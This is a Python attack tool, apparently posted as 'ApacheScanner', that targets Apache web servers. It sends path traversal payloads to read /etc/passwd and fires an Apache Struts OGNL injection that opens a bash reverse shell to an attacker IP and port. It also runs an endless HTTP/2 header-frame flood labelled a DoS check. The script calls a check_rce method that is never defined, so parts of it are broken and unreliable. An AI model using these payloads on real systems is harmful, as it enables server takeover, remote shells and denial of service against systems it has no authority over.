import argparse
import requests
import struct
import socket
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def header():
    print('''
 ▗▄▖▗▄▄▖ ▗▄▖ ▗▄▄▗▖ ▗▗▄▄▄▖     ▗▄▄▖▗▄▄▖▗▄▖▗▖  ▗▗▖  ▗▗▄▄▄▗▄▄▖
▐▌ ▐▐▌ ▐▐▌ ▐▐▌  ▐▌ ▐▐▌       ▐▌  ▐▌  ▐▌ ▐▐▛▚▖▐▐▛▚▖▐▐▌  ▐▌ ▐▌
▐▛▀▜▐▛▀▘▐▛▀▜▐▌  ▐▛▀▜▐▛▀▀▘     ▝▀▚▐▌  ▐▛▀▜▐▌ ▝▜▐▌ ▝▜▐▛▀▀▐▛▀▚▖
▐▌ ▐▐▌  ▐▌ ▐▝▚▄▄▐▌ ▐▐▙▄▄▖    ▗▄▄▞▝▚▄▄▐▌ ▐▐▌  ▐▐▌  ▐▐▙▄▄▐▌ ▐▌
                        https://github.com/Yqno
                                                            ''')

def print_custom_help():
    print('''\
Usage: ApacheScanner.py [options]

Apache HTTP Server scanning and overtaking tool written by Yqno.

Options:
  -h, --help            Show this help message and exit
  -u URL, --url URL     The target URL of your Apache HTTP Server (default is http://localhost:8080)
  -t TIMEOUT, --timeout TIMEOUT
                        The timeout of the request in seconds (default is 25)
  -p PORT, --port PORT  The port number of your Apache HTTP Server (default port is 80)
  -c COMMAND, --command COMMAND
                        The command to be executed on your Apache HTTP Server (default is ls -l)
  --rce                 Enable remote code execution on your Apache HTTP Server (default is False)
  --cmd CMD             Command to run if RCE is enabled (default is whoami)
  --lhost LHOST         Attacker IP for reverse shell (optional unless --rce is enabled)
  --lport LPORT         Attacker listening port for reverse shell (optional unless --rce is enabled)
''')

def main():
    parser = argparse.ArgumentParser(description='Apache HTTP Server overtaking tool written by Yqno.')

    parser.add_argument('-u', '--url', type=str, help='The target URL of your Apache HTTP Server (default is localhost)', default='http://localhost:8080')
    parser.add_argument('-t', '--timeout', type=int, help='The timeout of the request in seconds (default is 25)', default=25)
    parser.add_argument('-p', '--port', type=int, help='The port number of your Apache HTTP Server (default port is 80)', default=80)
    parser.add_argument('-c', '--command', type=str, help='The command to be executed on your Apache HTTP Server (default is ls -l)', default='ls -l')
    parser.add_argument('--rce', action='store_true', help='Enable remote code execution on your Apache HTTP Server (default is False)', default=False)
    parser.add_argument('--cmd', type=str, help='Command to run if RCE is enabled (default is whoami)', default="whoami")
    parser.add_argument('--lhost', type=str, help='Attacker IP for reverse shell (optional unless --rce is enabled)', default=None)
    parser.add_argument('--lport', type=int, help='Attacker listening port for reverse shell (optional unless --rce is enabled)', default=None)

    args = parser.parse_args()

    # Check if the user requested help
    if '--help' in sys.argv or '-h' in sys.argv:
        print_custom_help()
        sys.exit()

    # Validate RCE-related arguments
    if args.rce and (not args.lhost or not args.lport):
        print("[!] --lhost and --lport are required when --rce is enabled.")
        sys.exit()

    # Proceed with the rest of the script
    exploiter = Exploiter(args.url, args.timeout, args.port, args.command, args.rce, args.cmd, args.lhost, args.lport)
    exploiter.run_checks()

class Exploiter:
    def __init__(self, url, timeout, port, command, rce, cmd, lhost, lport):
        self.url = url
        self.timeout = timeout
        self.port = port
        self.command = command
        self.rce = rce
        self.cmd = cmd
        self.lhost = lhost
        self.lport = lport

        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
        }

    # Path Traversal Check
    def check_pathtraversal(self):
        print(f"[*] Checking for path traversal vulnerabilities on {self.url}")

        payloads = [
            "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            "/../../../../../../etc/passwd",
            "/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd",
            "/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini",
            "/..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
            "/..;/..;/..;/..;/etc/passwd"
        ]

        for payload in payloads:
            target = f"{self.url}{payload}"
            try:
                response = requests.get(target, headers=self.headers, timeout=self.timeout, verify=False)
                if "root:x:" in response.text or "Administrator" in response.text:
                    print(f"[+] Path traversal vulnerability found with payload: {payload}")
                else:
                    print(f"[-] Payload not vulnerable: {payload}")
            except Exception as e:
                print(f"[!] Error with payload {payload}: {e}")


    # Apache Struts RCE Check
    def check_apache_struts_rce(self):
        print(f"[*] Checking for Apache Struts RCE vulnerability on {self.url}")
        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        headers = {
            'Content-Type': f'{self.url}?${{(#_memberAccess[\'allowStaticMethodAccess\']=true)(#a=@java.lang.Runtime@getRuntime().exec(\'{payload}\'))}}'
        }

        try:
            response = requests.get(self.url, headers=headers, timeout=self.timeout)
            if response.status_code == 200:
                print("[+] Apache Struts RCE vulnerability found! RCE triggered.")
            else:
                print("[-] No Apache Struts RCE vulnerability detected.")
        except Exception as e:
            print(f"[!] Error: {e}")

    # DoS Attack Check
    def check_dosattack(self):
        print(f"[*] Checking for DoS vulnerability on {self.url}")
        try:
            hostname = self.url.split("//")[-1].split("/")[0]  # Extract hostname or IP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((hostname, self.port))

            s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
            SETTINGS = struct.pack('3B', 0x00, 0x00, 0x00) + struct.pack('B', 0x04) + struct.pack('B', 0x00) + struct.pack('>I', 0x00000000)
            s.sendall(SETTINGS)
            while True:
                HEADER_BLOCK_FRAME = b'\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
                HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:] + struct.pack('B', 0x09) + struct.pack('B', 0x01) + struct.pack('>I', 0x00000001)
                s.sendall(HEADERS + HEADER_BLOCK_FRAME)

        except BrokenPipeError:
            print("[!] Connection was forcibly closed by the server (Broken Pipe).")
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            s.close()



    def run_checks(self):
        self.check_pathtraversal()
        if self.rce:
            self.check_rce()
            self.check_apache_struts_rce()
        self.check_dosattack()


if __name__ == '__main__':
    header()
    main()
